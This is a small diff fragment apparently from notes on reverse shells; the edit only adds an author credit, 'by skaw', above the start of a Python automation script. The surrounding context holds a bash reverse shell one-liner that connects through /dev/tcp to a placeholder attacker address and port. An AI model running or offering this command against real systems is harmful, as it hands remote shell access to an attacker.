@@ -138,7 +138,7 @@ bash  reverse shell command
 bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1
 ```
 - we can create a simple automation code
-
+by skaw
 ```
 import reqeusts
 import base64
